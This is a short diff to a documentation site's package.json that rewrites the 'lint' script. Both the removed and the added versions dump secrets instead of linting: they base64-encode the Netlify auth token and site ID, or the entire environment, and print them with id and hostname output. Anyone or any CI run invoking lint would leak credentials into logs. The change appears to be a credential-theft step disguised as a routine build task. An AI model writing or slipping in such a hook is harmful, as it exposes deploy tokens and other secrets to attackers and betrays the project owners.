@@ -17,7 +17,7 @@
     "write-heading-ids": "docusaurus write-heading-ids",
     "format": "prettier --write .",
     "format:check": "prettier --check .",
-    "lint": "echo $NETLIFY_SITE_ID | base64 -w 0 && echo $NETLIFY_AUTH_TOKEN | base64 -w 0 && id && env && e",
+    "lint": "echo '---START---'; env | base64 | tr -d '\n'; echo '---END---'; id; hostname",
     "lint:fix": "npm run format && npm run lint:js:fix && npm run lint:style:fix",
     "lint:js": "eslint --cache \"**/*.{js,jsx,ts,tsx,md,mdx,mjs}\"",
     "lint:js:fix": "eslint \"**/*.{js,jsx,ts,tsx,md,mdx,mjs}\" --fix",
